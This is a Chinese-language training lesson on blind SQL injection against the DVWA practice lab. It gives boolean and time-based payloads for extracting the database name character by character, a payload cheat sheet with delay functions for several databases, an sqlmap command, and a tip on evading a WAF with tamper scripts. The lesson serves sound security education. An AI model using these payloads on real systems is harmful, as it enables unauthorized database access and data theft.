---
title: Day018：SQL 注入 - 盲注原理与实战
tags:
  - 网络安全
  - SQL注入
  - 盲注
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d018
date: 2026-02-09
updated: 2026-01-28
---

# Day018：SQL 注入 - 盲注原理与实战

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 3：SQL 注入入门 |
| **今日主题** | 盲注：当页面没有回显时 |
| **预计时间** | 2.5 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你发现一个页面输入 `1'` 会报错，但输入 `1' UNION SELECT 1,2 --` 后，页面只显示"查询成功"或"查询失败"，看不到任何数据。
>
> **问题**：页面不回显数据，怎么"偷"出信息？
>
> **今天的任务**：学会盲注——通过页面的间接反馈来推断数据。

---

## 今日目标

- [ ] 理解盲注的概念
- [ ] 掌握布尔盲注技术
- [ ] 掌握时间盲注技术
- [ ] 能手工或用工具进行盲注

**闯关条件**：使用盲注技术获取数据库名的第一个字符。

---

## 实战任务（先动手！）

### 任务 1：理解盲注场景（10 分钟）

在 DVWA 中把安全级别改为 **Medium** 或 **High**。

观察区别：
- **Low**：页面显示查询结果（有回显）
- **High**：页面只显示"用户存在"或无响应（无回显）

**盲注的本质**：通过页面的**间接反馈**（成功/失败、快/慢）来推断数据。

---

### 任务 2：布尔盲注（30 分钟）

**原理**：根据页面返回的不同状态（真/假）来判断条件是否成立。

**基础测试**：
```
1' AND 1=1 --    → 页面正常（条件为真）
1' AND 1=2 --    → 页面异常或无数据（条件为假）
```

**猜测数据库名长度**：
```sql
1' AND LENGTH(database())=1 --    → 假
1' AND LENGTH(database())=2 --    → 假
1' AND LENGTH(database())=3 --    → 假
1' AND LENGTH(database())=4 --    → 真！
```

数据库名长度是 4（dvwa）。

**猜测数据库名第一个字符**：
```sql
1' AND SUBSTRING(database(),1,1)='a' --    → 假
1' AND SUBSTRING(database(),1,1)='b' --    → 假
1' AND SUBSTRING(database(),1,1)='c' --    → 假
1' AND SUBSTRING(database(),1,1)='d' --    → 真！
```

第一个字符是 `d`！

**继续猜测**：
```sql
1' AND SUBSTRING(database(),2,1)='v' --    → 真
1' AND SUBSTRING(database(),3,1)='w' --    → 真
1' AND SUBSTRING(database(),4,1)='a' --    → 真
```

数据库名是 `dvwa`！

---

### 任务 3：优化布尔盲注（15 分钟）

逐个字符猜太慢，用二分法加速！

**用 ASCII 码判断**：
```sql
-- 判断第一个字符的 ASCII 码
1' AND ASCII(SUBSTRING(database(),1,1))>100 --   → 真（d 的 ASCII 是 100）
1' AND ASCII(SUBSTRING(database(),1,1))>110 --   → 假
1' AND ASCII(SUBSTRING(database(),1,1))>105 --   → 假
1' AND ASCII(SUBSTRING(database(),1,1))>102 --   → 假
1' AND ASCII(SUBSTRING(database(),1,1))>100 --   → 假
1' AND ASCII(SUBSTRING(database(),1,1))=100 --   → 真！
```

ASCII 100 对应字符 `d`。

二分法只需要约 7 次查询就能确定一个字符（2^7 = 128 > 常用字符范围）。

---

### 任务 4：时间盲注（30 分钟）

**场景**：页面无论真假都显示一样的内容。

**原理**：让数据库"睡眠"，通过响应时间判断条件是否成立。

**基础测试**：
```sql
1' AND SLEEP(5) --
```

如果页面延迟 5 秒才响应，说明 SLEEP 执行了，存在注入。

**条件时间盲注**：
```sql
1' AND IF(LENGTH(database())=4, SLEEP(5), 0) --
```

- 如果数据库名长度是 4，延迟 5 秒
- 否则立即返回

**猜测字符**：
```sql
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0) --
```

延迟 5 秒 → 第一个字符是 `d`！

---

### 任务 5：使用 SQLMap 进行盲注（15 分钟）

SQLMap 自动处理盲注：

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=high" \
  --technique=B \
  --dbs
```

`--technique=B` 指定使用布尔盲注。

`--technique=T` 指定使用时间盲注。

---

## 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 理解布尔盲注原理 | |
| 手工猜出数据库名长度 | |
| 手工猜出数据库名第一个字符 | |
| 理解时间盲注原理 | |
| 用 SQLMap 完成盲注 | |

---

## 底层补课

### 什么是盲注？

**定义**：当页面不直接显示 SQL 查询结果时，通过间接方式推断数据的注入技术。

### 盲注类型

| 类型 | 判断依据 | 适用场景 |
|------|----------|----------|
| 布尔盲注 | 页面内容不同（真/假） | 页面有两种状态 |
| 时间盲注 | 响应时间不同（快/慢） | 页面状态完全相同 |
| 报错盲注 | 错误信息中包含数据 | 有详细错误提示 |

### 关键 MySQL 函数

| 函数 | 作用 | 示例 |
|------|------|------|
| `LENGTH()` | 字符串长度 | `LENGTH('abc')` = 3 |
| `SUBSTRING()` | 截取子串 | `SUBSTRING('abc',1,1)` = 'a' |
| `ASCII()` | 字符转 ASCII | `ASCII('a')` = 97 |
| `CHAR()` | ASCII 转字符 | `CHAR(97)` = 'a' |
| `IF()` | 条件判断 | `IF(1=1,'yes','no')` = 'yes' |
| `SLEEP()` | 延迟秒数 | `SLEEP(5)` |

### 盲注效率对比

| 方法 | 每字符查询次数 | 速度 |
|------|----------------|------|
| 逐字符猜测 | 约 36 次 | 慢 |
| 二分法 | 约 7 次 | 中 |
| 批量查询 | 1 次 | 快（需要特定条件） |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| SLEEP 无效 | 页面不延迟 | 数据库可能不支持，或 SLEEP 被禁用 |
| 布尔条件无区别 | 页面始终相同 | 改用时间盲注 |
| 太慢 | 猜一个字符要很久 | 用二分法或工具 |
| 被拦截 | WAF 阻断 | 用 SQLMap tamper 脚本 |

---

## 知识卡片速查

### 盲注 Payload 速查

```sql
-- 布尔盲注
1' AND 1=1 --
1' AND 1=2 --
1' AND LENGTH(database())=4 --
1' AND SUBSTRING(database(),1,1)='d' --
1' AND ASCII(SUBSTRING(database(),1,1))>100 --

-- 时间盲注
1' AND SLEEP(5) --
1' AND IF(1=1, SLEEP(5), 0) --
1' AND IF(LENGTH(database())=4, SLEEP(5), 0) --
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0) --

-- 其他数据库的延时函数
-- PostgreSQL: pg_sleep(5)
-- SQL Server: WAITFOR DELAY '0:0:5'
-- Oracle: DBMS_PIPE.RECEIVE_MESSAGE('a',5)
```

### ASCII 常用字符

| 字符 | ASCII |
|------|-------|
| 0-9 | 48-57 |
| A-Z | 65-90 |
| a-z | 97-122 |
| _ | 95 |

---

## 常见问题

**Q1：为什么盲注这么慢？**

A1：因为需要一位一位猜测。每个字符可能需要 7-36 次请求。一个 32 字符的密码需要 224-1152 次请求。这就是为什么需要自动化工具。

**Q2：布尔盲注和时间盲注怎么选？**

A2：
- 优先布尔盲注（更快）
- 如果页面状态完全相同，才用时间盲注
- 时间盲注要考虑网络延迟的影响

**Q3：如何判断延迟是注入造成的还是网络问题？**

A3：
1. 多测几次，排除网络波动
2. 用明确为假的条件测试（如 `IF(1=2, SLEEP(5), 0)`）应该不延迟
3. 增大 SLEEP 时间（如 10 秒），更容易区分

---

## 明日预告

**Day 019：SQL 注入 - 绕过技巧**

明天你将：
- 学习绕过常见过滤的技巧
- 了解 WAF 绑过方法
- 处理特殊字符被过滤的情况

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学会了盲注——在"看不见"的情况下"偷"数据。
>
> 布尔盲注和时间盲注是最常见的两种技术。
>
> 盲注虽然慢，但很多真实环境就是没有回显的。
>
> 记住：**有回显用 UNION，没回显用盲注**。
>
> 工具可以加速，但原理必须懂。

```bash
echo "Day 018 Complete! 盲注原理 GET！"
```
